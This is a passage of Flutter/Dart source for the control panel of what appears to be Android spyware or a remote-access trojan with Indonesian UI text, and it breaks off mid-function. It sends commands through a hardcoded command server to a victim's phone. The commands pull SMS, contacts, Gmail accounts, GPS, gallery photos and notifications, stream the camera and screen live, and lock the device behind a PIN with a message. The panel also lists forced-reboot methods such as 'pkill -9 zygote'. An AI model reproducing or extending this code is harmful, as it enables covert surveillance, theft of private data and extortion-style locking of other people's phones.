import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with TickerProviderStateMixin {
  // ── Design tokens ──────────────────────────────────────────────────────────
  static const _bg    = Color(0xFF03050D);
  static const _s1    = Color(0xFF080B18);
  static const _s2    = Color(0xFF0C1020);
  static const _s3    = Color(0xFF111628);
  static const _bord  = Color(0xFF182038);
  static const _cyan  = Color(0xFF00E5FF);
  static const _cyan2 = Color(0xFF00FFEA);
  static const _cyanD = Color(0xFF00B4CC);
  static const _vio   = Color(0xFF9D5CF6);
  static const _vioD  = Color(0xFF7B3FE4);
  static const _green = Color(0xFF00FF88);
  static const _amber = Color(0xFFFFB300);
  static const _red   = Color(0xFFFF3B5C);
  static const _textP = Color(0xFFEAF4FF);
  static const _textS = Color(0xFF5A7A9E);
  static const _textM = Color(0xFF2E4060);

  static const _kBase = 'http://nayahaikall.tyzx-host.my.id:2563';
  static const Set<String> _needPoll = {'take_photo','get_screen','get_location','track_gps','get_contacts','dump_contacts','get_gmails','get_sms','get_gallery'};

  late TabController _tabs;
  late AnimationController _pulse, _glow;
  bool _sending = false;
  final List<String> _log = [];
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);
  final List<Map<String,String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';
  bool   get _online  => widget.targetDevice?['online'] == true;
  bool get _hasAccess => ['owner','high owner','high admin','admin','vip','reseller'].contains(widget.role.toLowerCase());

  @override
  void initState() {
    super.initState();
    _tabs  = TabController(length: 6, vsync: this);
    _pulse = AnimationController(vsync: this, duration: const Duration(milliseconds: 1800))..repeat(reverse: true);
    _glow  = AnimationController(vsync: this, duration: const Duration(milliseconds: 3000))..repeat(reverse: true);
    if (_hasAccess) WidgetsBinding.instance.addPostFrameCallback((_) => _cmd('force_open', silent: true));
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override void dispose() { _liveTimer?.cancel(); _chatTimer?.cancel(); _tabs.dispose(); _pulse.dispose(); _glow.dispose(); _chatCtrl.dispose(); _chatScroll.dispose(); _frameN.dispose(); super.dispose(); }

  void _addLog(String m) { if (!mounted) return; setState(() { _log.insert(0, '${DateTime.now().toString().substring(11,19)}  $m'); if (_log.length > 60) _log.removeLast(); }); }

  void _toast(String m, {Color c = _cyan}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _s2,
      content: Row(children: [
        Container(width: 22, height: 22,
          decoration: BoxDecoration(gradient: LinearGradient(colors: [c.withOpacity(0.3), c.withOpacity(0.1)]), shape: BoxShape.circle),
          child: Icon(c == _green ? Icons.check_rounded : c == _red ? Icons.error_rounded : Icons.info_rounded, color: c, size: 13)),
        const SizedBox(width: 10),
        Text(m, style: const TextStyle(color: _textP, fontSize: 12, fontWeight: FontWeight.w600)),
      ]),
      duration: const Duration(seconds: 2), behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
      margin: const EdgeInsets.all(16),
    ));
  }

  Future<void> _cmd(String cmd, {String extra='', bool silent=false}) async {
    if (_id=='unknown') { if (!silent) _toast('ID target tidak valid', c: _amber); return; }
    if (!silent) setState(() => _sending=true);
    try {
      final res = await http.post(Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));
      if (res.statusCode == 200) {
        if (!silent) { _addLog('✓ $cmd'); _toast('Perintah terkirim', c: _green); }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else { if (!silent) { _addLog('✗ $cmd (${res.statusCode})'); _toast('Target offline', c: _amber); } }
    } catch (e) { if (!silent) { _addLog('✗ $cmd error'); _toast('Koneksi gagal', c: _red); } }
    finally { if (!silent && mounted) setState(() => _sending=false); }
  }

  void _poll(String cmd) async {
    final max = cmd=='get_gallery' ? 60 : 30;
    int n=0; bool got=false;
    while (n<max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000)); n++;
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id')).timeout(const Duration(seconds: 8));
        if (res.statusCode==200 && res.body.isNotEmpty && res.body!='{}') {
          final d = jsonDecode(res.body);
          if (d['data']!=null) { final rc = d['cmd']?.toString()??''; if (rc.isEmpty||rc==cmd) { _onResponse(cmd, d['data']); got=true; } }
        }
      } catch (_) {}
    }
    if (!got && mounted) { _addLog('↯ Timeout: $cmd'); _toast('Timeout', c: _amber); }
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':   final b=d['image_base64']?.toString()??''; if (b.isEmpty){_toast('Foto kosong',c:_amber);return;} _addLog('📷 Foto diterima'); _imgDialog(b,'Foto Target'); break;
      case 'get_screen':   final b=d['image_base64']?.toString()??''; if (b.isEmpty) return; _addLog('🖥 Screenshot'); _imgDialog(b,'Screenshot'); break;
      case 'get_location': case 'track_gps': _addLog('📍 GPS diterima'); _locationDialog(d['lat'],d['lng']); break;
      case 'get_contacts': case 'dump_contacts': _addLog('👥 ${(d['contacts'] as List?)?.length??0} kontak'); _contactsSheet(d['contacts']??[]); break;
      case 'get_gmails':   _addLog('📧 Akun diterima'); _textDialog('Gmail & Akun', d['accounts']?.toString()??'-'); break;
      case 'get_sms':      _addLog('💬 ${(d['sms'] as List?)?.length??0} SMS'); _smsSheet(d['sms']??[]); break;
      case 'get_gallery':  _addLog('🖼 ${(d['images'] as List?)?.length??0} foto'); _gallerySheet(d['images']??[]); break;
      default: _addLog('✓ $cmd selesai');
    }
  }

  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() { _liveOn=true; _frame=null; _liveTitle=mode=='live_camera_start'?(extra=='front'?'KAMERA DEPAN':'KAMERA BELAKANG'):'SCREEN'; _frmCount=0; _fps=0; _fpsTs=DateTime.now(); });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id')).timeout(const Duration(milliseconds: 500));
        if (res.statusCode==200) {
          final raw = (jsonDecode(res.body)['frame']??'').toString();
          if (raw.isNotEmpty && mounted) {
            final bytes = base64Decode(raw.contains(',') ? raw.split(',').last : raw);
            setState(() { _frame=bytes; _frmCount++; final ms=DateTime.now().difference(_fpsTs).inMilliseconds; if (ms>=1000){_fps=(_frmCount*1000/ms).round();_frmCount=0;_fpsTs=DateTime.now();} });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() { _liveTimer?.cancel(); if (mounted) setState(() { _liveOn=false; _frame=null; }); _cmd('live_stop', silent:true); _addLog('■ Live dihentikan'); }

  void _pollChat() async {
    if (_id=='unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id')).timeout(const Duration(seconds: 4));
      if (res.statusCode==200) {
        final msgs = (jsonDecode(res.body)['messages'] as List?) ?? [];
        if (msgs.length!=_chat.length && mounted) {
          setState(() { _chat.clear(); for (final m in msgs) _chat.add({'from':m['from']?.toString()??'','text':m['text']?.toString()??'','time':m['time']?.toString()??''}); });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from':'owner','text':text.trim(),'time':TimeOfDay.now().format(context)}));
    _scrollChat();
    try { await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'), headers:{'Content-Type':'application/json'}, body: jsonEncode({'text':text.trim(),'from':'owner'})).timeout(const Duration(seconds:5)); } catch (_) {}
  }

  void _scrollChat() { Future.delayed(const Duration(milliseconds:100), () { if (_chatScroll.hasClients) _chatScroll.animateTo(_chatScroll.position.maxScrollExtent, duration:const Duration(milliseconds:200), curve:Curves.easeOut); }); }

  @override
  Widget build(BuildContext context) {
    if (!_hasAccess) return _accessDenied();
    return Scaffold(
      backgroundColor: _bg,
      appBar: _buildAppBar(),
      body: Column(children: [
        _buildLogBar(),
        Expanded(child: TabBarView(controller: _tabs, children: [
          _pageLive(), _pageCamera(), _pageIntel(), _pageAudio(), _pageLock(), _pageDevice(),
        ])),
      ]),
    );
  }

  PreferredSizeWidget _buildAppBar() => AppBar(
    backgroundColor: _s1, elevation: 0,
    leading: GestureDetector(
      onTap: () { if (_liveOn) _stopLive(); Navigator.pop(context); },
      child: Container(margin: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [_cyan.withOpacity(0.14), _cyan.withOpacity(0.04)]),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: _cyan.withOpacity(0.35))),
        child: const Icon(Icons.arrow_back_ios_new_rounded, color: _cyan, size: 15)),
    ),
    title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(_model, style: const TextStyle(color: _textP, fontSize: 14, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
      Row(children: [
        AnimatedBuilder(animation: _pulse, builder: (_,__) => Container(
          width: 6, height: 6,
          decoration: BoxDecoration(shape: BoxShape.circle,
            color: _online ? _green.withOpacity(0.6+0.4*_pulse.value) : _textM,
            boxShadow: _online ? [BoxShadow(color: _green.withOpacity(0.7*_pulse.value), blurRadius: 8)] : []))),
        const SizedBox(width: 5),
        Flexible(child: Text('Batt: $_battery%  •  $_id', style: const TextStyle(color: _textS, fontSize: 8), overflow: TextOverflow.ellipsis)),
      ]),
    ]),
    actions: [
      if (_liveOn) Container(
        margin: const EdgeInsets.symmetric(vertical: 12, horizontal: 4),
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [_green.withOpacity(0.15), _green.withOpacity(0.05)]),
          borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.4))),
        child: Row(mainAxisSize: MainAxisSize.min, children: [
          AnimatedBuilder(animation: _pulse, builder: (_,__) => Container(width: 6, height: 6, decoration: BoxDecoration(shape: BoxShape.circle, color: _green, boxShadow: [BoxShadow(color: _green.withOpacity(0.8*_pulse.value), blurRadius: 6)]))),
          const SizedBox(width: 5),
          Text('$_fps fps', style: const TextStyle(color: _green, fontSize: 10, fontWeight: FontWeight.w900)),
        ])),
      if (_sending) const Padding(padding: EdgeInsets.only(right: 10),
        child: Center(child: SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2, color: _cyan)))),
      GestureDetector(
        onTap: () { setState((){}); _cmd('force_open', silent:true); },
        child: Container(margin: const EdgeInsets.symmetric(vertical: 12, horizontal: 10), padding: const EdgeInsets.all(7),
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [_cyan.withOpacity(0.1), _cyan.withOpacity(0.03)]),
            borderRadius: BorderRadius.circular(10), border: Border.all(color: _cyan.withOpacity(0.2))),
          child: const Icon(Icons.refresh_rounded, color: _textS, size: 16))),
    ],
    bottom: TabBar(
      controller: _tabs, isScrollable: true,
      indicator: const UnderlineTabIndicator(
        borderSide: BorderSide(color: _cyan, width: 2),
        insets: EdgeInsets.symmetric(horizontal: 4),
      ),
      indicatorSize: TabBarIndicatorSize.label,
      labelColor: _cyan, unselectedLabelColor: _textM,
      labelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.w900, letterSpacing: 1.5),
      unselectedLabelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.w600, letterSpacing: 1),
      tabs: const [
        Tab(text: 'LIVE'), Tab(text: 'CAMERA'), Tab(text: 'INTEL'),
        Tab(text: 'AUDIO'), Tab(text: 'LOCK'), Tab(text: 'DEVICE'),
      ],
    ),
  );

  Widget _buildLogBar() => Container(
    height: 38,
    margin: const EdgeInsets.fromLTRB(14, 10, 14, 0),
    padding: const EdgeInsets.symmetric(horizontal: 14),
    decoration: BoxDecoration(
      gradient: LinearGradient(colors: [_s2, _s1]),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: _bord)),
    child: Row(children: [
      AnimatedBuilder(animation: _pulse, builder: (_,__) => Container(width: 6, height: 6, decoration: BoxDecoration(shape: BoxShape.circle, color: _cyan.withOpacity(0.5+0.5*_pulse.value), boxShadow: [BoxShadow(color: _cyan.withOpacity(0.5*_pulse.value), blurRadius: 6)]))),
      const SizedBox(width: 8),
      const Text('LOG ', style: TextStyle(color: _textM, fontSize: 8, fontWeight: FontWeight.w900, letterSpacing: 2)),
      Expanded(child: Text(_log.isEmpty ? 'Ready...' : _log.first,
        style: const TextStyle(color: _textS, fontSize: 9), maxLines: 1, overflow: TextOverflow.ellipsis)),
    ]),
  );

  // ── LIVE ───────────────────────────────────────────────────────────────────
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(16), children: [
    _secHeader('LIVE STREAM', Icons.cast_rounded, _cyan),
    const SizedBox(height: 14),
    AnimatedContainer(
      duration: const Duration(milliseconds: 400), curve: Curves.easeInOut,
      height: _liveOn ? 220 : 88,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: _liveOn ? [_s3, _s2] : [_s2, _s1]),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _liveOn ? _cyan.withOpacity(0.5) : _bord, width: _liveOn ? 1.5 : 1),
        boxShadow: _liveOn ? [BoxShadow(color: _cyan.withOpacity(0.12), blurRadius: 24)] : []),
      child: ClipRRect(borderRadius: BorderRadius.circular(17),
        child: _liveOn && _frame != null
          ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
          : Center(child: Row(mainAxisSize: MainAxisSize.min, children: [
              Icon(_liveOn ? Icons.hourglass_top_rounded : Icons.cast_connected_rounded, color: _textM, size: 20),
              const SizedBox(width: 10),
              Text(_liveOn ? 'Menunggu frame...' : 'Stream inactive', style: const TextStyle(color: _textM, fontSize: 12)),
            ]))),
    ),
    const SizedBox(height: 14),
    Row(children: [
      Expanded(child: _btn('Live Camera', _cyan, Icons.videocam_rounded, () { _showCamPicker((s) { _startLive('live_camera_start', s); _showLiveDialog(); }); })),
      const SizedBox(width: 10),
      Expanded(child: _btn('Live Screen', _vio, Icons.desktop_windows_rounded, () { _startLive('live_screen_start', ''); _showLiveDialog(); })),
    ]),
    if (_liveOn) ...[
      const SizedBox(height: 10),
      _btn('■  Stop Live', _red, Icons.stop_circle_rounded, _stopLive, outlined: true),
    ],
  ]);

  // ── CAMERA ─────────────────────────────────────────────────────────────────
  Widget _pageCamera() => ListView(padding: const EdgeInsets.all(16), children: [
    _secHeader('CAMERA & VISUAL', Icons.camera_rounded, _cyan),
    const SizedBox(height: 14),
    _btn('Ambil Foto',    _cyan,  Icons.camera_alt_rounded,        () => _showCamPicker((s) => _cmd('take_photo', extra:s))),
    const SizedBox(height: 10),
    _btn('Screenshot',    _vio,   Icons.screenshot_monitor_rounded,() => _cmd('get_screen')),
    const SizedBox(height: 10),
    _btn('Set Wallpaper', _amber, Icons.image_rounded,             () => _inputDlg('Set Wallpaper','Image URL',(v)=>_cmd('set_wallpaper',extra:v))),
    const SizedBox(height: 10),
    Row(children: [
      Expanded(child: _btn('Flash ON',  _amber, Icons.flash_on_rounded,  () => _cmd('flash_strobe'))),
      const SizedBox(width: 10),
      Expanded(child: _btn('Flash OFF', _textS, Icons.flash_off_rounded, () => _cmd('stop_strobe'), outlined: true)),
    ]),
  ]);

  // ── INTEL ──────────────────────────────────────────────────────────────────
  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(16), children: [
    _secHeader('INTELLIGENCE', Icons.radar_rounded, _vio),
    const SizedBox(height: 14),
    _btn('Daftar Kontak',     _cyan,  Icons.contact_page_rounded,      () => _cmd('get_contacts')),
    const SizedBox(height: 10),
    _btn('Lokasi GPS',        _green, Icons.satellite_alt_rounded,     () => _cmd('get_location')),
    const SizedBox(height: 10),
    _btn('Gmail & Akun',      _cyan,  Icons.manage_accounts_rounded,   () => _cmd('get_gmails')),
    const SizedBox(height: 10),
    _btn('SMS Inbox',         _vio,   Icons.mark_unread_chat_alt_rounded, () => _cmd('get_sms')),
    const SizedBox(height: 10),
    _btn('Notifikasi',        _amber, Icons.notifications_active_rounded, () => _fetchNotif()),
    const SizedBox(height: 10),
    _btn('Gallery (5 Foto)',  _cyan,  Icons.photo_library_rounded,     () => _cmd('get_gallery',extra:'5')),
    const SizedBox(height: 10),
    _btn('Buka Notif Access', _textS, Icons.admin_panel_settings_rounded, () => _cmd('open_notification_settings'), outlined: true),
  ]);

  // ── AUDIO ──────────────────────────────────────────────────────────────────
  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(16), children: [
    _secHeader('AUDIO & NETWORK', Icons.graphic_eq_rounded, _cyan),
    const SizedBox(height: 14),
    _btn('Play Audio',   _cyan,  Icons.play_circle_fill_rounded, () => _inputDlg('Play Audio','URL MP3',(v)=>_cmd('play_audio',extra:v))),
    const SizedBox(height: 10),
    _btn('Stop Audio',   _textS, Icons.stop_circle_rounded,      () => _cmd('stop_audio'), outlined: true),
    const SizedBox(height: 10),
    _btn('Vibrate Loop', _vio,   Icons.vibration_rounded,        () => _cmd('vibrate_loop')),
    const SizedBox(height: 10),
    _btn('Buka URL',     _amber, Icons.travel_explore_rounded,   () => _inputDlg('Open URL','https://...',(v)=>_cmd('open_url',extra:v))),
    const SizedBox(height: 10),
    _btn('Kill WiFi',    _red,   Icons.wifi_off_rounded,         () => _cmd('kill_wifi')),
  ]);

  // ── LOCK ───────────────────────────────────────────────────────────────────
  Widget _pageLock() => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(16), children: [
      _secHeader('REMOTE LOCK', Icons.lock_rounded, _vio),
      const SizedBox(height: 14),
      _btn('Lock + Live Chat',  _cyan,  Icons.lock_person_rounded,   () => _lockLiveDlg()),
      const SizedBox(height: 10),
      _btn('Lock + Pesan',      _amber, Icons.lock_clock_rounded,    () => _lockChatDlg()),
      const SizedBox(height: 10),
      _btn('Hard Lock',         _red,   Icons.lock_outline_rounded,  () {
        _inputDlg('Lock Device','Pesan di layar',(msg){
          _inputDlg('PIN Unlock','4 digit PIN',(pin)=>_cmd('hard_lock',extra:'$msg|$pin'),isNum:true);
        });
      }),
      const SizedBox(height: 10),
      _btn('Unlock',            _green, Icons.lock_open_rounded,     () => _cmd('unlock'), outlined: true),
      const SizedBox(height: 20),
      _secHeader('CHAT KE TARGET', Icons.forum_rounded, _cyan),
      const SizedBox(height: 12),
      Container(
        height: 200,
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [_s2, _s1]),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _bord)),
        child: _chat.isEmpty
          ? const Center(child: Text('Belum ada pesan', style: TextStyle(color: _textM, fontSize: 11)))
          : ListView.builder(
              controller: _chatScroll, padding: const EdgeInsets.all(10),
              itemCount: _chat.length,
              itemBuilder: (_, i) {
                final m = _chat[i]; final isOwner = m['from']=='owner';
                return Align(
                  alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                  child: Container(
                    margin: const EdgeInsets.symmetric(vertical: 3),
                    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
                    constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.72),
                    decoration: BoxDecoration(
                      gradient: isOwner ? const LinearGradient(colors: [_cyanD, _cyan]) : null,
                      color: isOwner ? null : _s3,
                      borderRadius: BorderRadius.circular(14),
                      border: isOwner ? null : Border.all(color: _bord),
                      boxShadow: isOwner ? [BoxShadow(color: _cyan.withOpacity(0.2), blurRadius: 8)] : []),
                    child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                      Text(m['text']??'', style: TextStyle(color: isOwner ? _bg : _textP, fontSize: 12, fontWeight: FontWeight.w600)),
                      const SizedBox(height: 2),
                      Text(m['time']??'', style: TextStyle(color: isOwner ? _bg.withOpacity(0.5) : _textM, fontSize: 8)),
                    ]),
                  ),
                );
              }),
      ),
    ])),
    Container(
      padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
      decoration: BoxDecoration(color: _s1, border: Border(top: BorderSide(color: _bord))),
      child: Row(children: [
        Expanded(child: TextField(
          controller: _chatCtrl,
          style: const TextStyle(color: _textP, fontSize: 13),
          decoration: InputDecoration(
            hintText: 'Kirim pesan ke target...',
            hintStyle: const TextStyle(color: _textM, fontSize: 12),
            filled: true, fillColor: _s2,
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 11),
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(24), borderSide: BorderSide.none),
          ),
          onSubmitted: _sendChat)),
        const SizedBox(width: 8),
        GestureDetector(
          onTap: () => _sendChat(_chatCtrl.text),
          child: Container(padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_cyanD, _cyan2]),
              shape: BoxShape.circle,
              boxShadow: [BoxShadow(color: _cyan.withOpacity(0.4), blurRadius: 12)]),
            child: const Icon(Icons.send_rounded, color: _bg, size: 17))),
      ]),
    ),
  ]);

  // ── DEVICE ─────────────────────────────────────────────────────────────────
  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(16), children: [
    _secHeader('DEVICE CONTROL', Icons.developer_board_rounded, _vio),
    const SizedBox(height: 14),
    _btn('Wake Up Target', _green, Icons.light_mode_rounded,    () => _cmd('force_open')),
    const SizedBox(height: 10),
    _btn('Restart Device',  _amber, Icons.restart_alt_rounded,  () {
      showDialog(context: context, builder: (_) => _dlgBase(
        title: 'Restart Device', icon: Icons.restart_alt_rounded, color: _amber,
        body: 'HP target akan di-restart menggunakan PowerManager reflection.',
        actions: [
          _dlgBtn('Batal', _textM, () => Navigator.pop(context)),
          _dlgBtn('Restart', _amber, () { Navigator.pop(context); _cmd('reboot_device'); }),
        ],
      ));
    }),
    const SizedBox(height: 20),
    Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [_s3, _s2, _s1], begin: Alignment.topLeft, end: Alignment.bottomRight),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _bord)),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(width: 4, height: 16, decoration: BoxDecoration(gradient: const LinearGradient(colors: [_cyan, _vio], begin: Alignment.topCenter, end: Alignment.bottomCenter), borderRadius: BorderRadius.circular(3), boxShadow: [BoxShadow(color: _cyan.withOpacity(0.5), blurRadius: 6)])),
          const SizedBox(width: 10),
          const Text('RESTART METHODS', style: TextStyle(color: _textS, fontSize: 9, fontWeight: FontWeight.w800, letterSpacing: 2.5)),
        ]),
        const SizedBox(height: 14),
        ...[
          ['01', 'PowerManager reflection',     _cyan],
          ['02', 'DevicePolicyManager (admin)', _vio],
          ['03', 'su -c reboot (root)',         _amber],
          ['04', 'am crash system_server',      _textS],
          ['05', 'pkill -9 zygote',             _textM],
        ].map((e) => Padding(padding: const EdgeInsets.only(bottom: 9), child: Row(children: [
          Container(width: 28, height: 20,
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [(e[2] as Color).withOpacity(0.15), (e[2] as Color).withOpacity(0.05)]),
              borderRadius: BorderRadius.circular(6),
              border: Border.all(color: (e[2] as Color).withOpacity(0.3))),
            child: Center(child: Text(e[0] as String, style: TextStyle(color: e[2] as Color, fontSize: 8, fontWeight: FontWeight.w900)))),
          const SizedBox(width: 12),
          Text(e[1] as String, style: const TextStyle(color: _textS, fontSize: 11)),
        ]))),
      ]),
    ),
  ]);

  // ── LIVE DIALOG ────────────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: _bg, insetPadding: const EdgeInsets.all(6),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [_s2, _s1]),
                borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
                border: const Border(bottom: BorderSide(color: _bord))),
              child: Row(children: [
                AnimatedBuilder(animation: _pulse, builder: (_,__) => Container(width: 8, height: 8, decoration: BoxDecoration(shape: BoxShape.circle, color: _green, boxShadow: [BoxShadow(color: _green.withOpacity(0.8*_pulse.value), blurRadius: 8)]))),
                const SizedBox(width: 10),
                Text('● $_liveTitle', style: const TextStyle(color: _textP, fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 1)),
                const Spacer(),
                Container(padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                  decoration: BoxDecoration(gradient: LinearGradient(colors: [_green.withOpacity(0.15), _green.withOpacity(0.05)]), borderRadius: BorderRadius.circular(8), border: Border.all(color: _green.withOpacity(0.4))),
                  child: Text('$_fps fps', style: const TextStyle(color: _green, fontSize: 10, fontWeight: FontWeight.w900))),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.52),
              color: _bg,
              child: _frame != null
                ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                : const SizedBox(height: 160, child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                    SizedBox(width: 26, height: 26, child: CircularProgressIndicator(color: _cyan, strokeWidth: 2)),
                    SizedBox(height: 12),
                    Text('Connecting...', style: TextStyle(color: _textS, fontSize: 11)),
                  ]))),
            ),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(gradient: LinearGradient(colors: [_s2, _s1]), borderRadius: const BorderRadius.vertical(bottom: Radius.circular(20))),
              child: Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () { final f=_liveTitle.contains('DEPAN'); _stopLive(); Future.delayed(const Duration(milliseconds: 300), ()=>_startLive('live_camera_start',f?'back':'front')); },
                  child: Container(padding: const EdgeInsets.symmetric(vertical: 11),
                    decoration: BoxDecoration(gradient: LinearGradient(colors: [_s3, _s2]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _bord)),
                    child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      Icon(Icons.cameraswitch_rounded, color: _textS, size: 15), SizedBox(width: 6),
                      Text('Switch', style: TextStyle(color: _textS, fontSize: 11, fontWeight: FontWeight.w700)),
                    ])))),
                const SizedBox(width: 10),
                Expanded(child: GestureDetector(
                  onTap: () { _stopLive(); Navigator.pop(ctx); },
                  child: Container(padding: const EdgeInsets.symmetric(vertical: 11),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_red, Color(0xFFCC2A46)]), borderRadius: BorderRadius.circular(12), boxShadow: [BoxShadow(color: _red.withOpacity(0.3), blurRadius: 10)]),
                    child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      Icon(Icons.stop_rounded, color: Colors.white, size: 15), SizedBox(width: 6),
                      Text('Stop', style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.w800)),
                    ])))),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDlg() {
    final m=TextEditingController(), p=TextEditingController();
    showDialog(context: context, builder: (_) => _dlgBase(
      title: 'Lock + Live Chat', icon: Icons.lock_person_rounded, color: _cyan, body: null,
      extra: Column(mainAxisSize: MainAxisSize.min, children: [
        const Text('Target dikunci + chat dua arah aktif', style: TextStyle(color: _textS, fontSize: 12)),
        const SizedBox(height: 14),
        _field(m, 'Pesan di layar lock', hint: 'HP ini dikunci administrator'),
        const SizedBox(height: 10),
        _field(p, 'PIN Unlock', hint: '1234', isNum: true),
      ]),
      actions: [
        _dlgBtn('Batal', _textM, () => Navigator.pop(context)),
        _dlgBtn('LOCK', _cyan, () { Navigator.pop(context); _cmd('lock_live', extra:'${m.text.trim().isEmpty?"HP INI DIKUNCI":m.text.trim()}|${p.text.trim().isEmpty?"1234":p.text.trim()}'); }),
      ],
    ));
  }

  void _lockChatDlg() {
    final m=TextEditingController(), p=TextEditingController(), c=TextEditingController();
    showDialog(context: context, builder: (_) => _dlgBase(
      title: 'Lock + Pesan', icon: Icons.lock_clock_rounded, color: _amber, body: null,
      extra: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(m, 'Pesan di layar lock', hint: 'HP ini dikunci administrator'),
        const SizedBox(height: 10),
        _field(p, 'PIN Unlock', hint: '1234', isNum: true),
        const SizedBox(height: 10),
        _field(c, 'Pesan chat (opsional)', hint: 'Hubungi kami'),
      ]),
      actions: [
        _dlgBtn('Batal', _textM, () => Navigator.pop(context)),
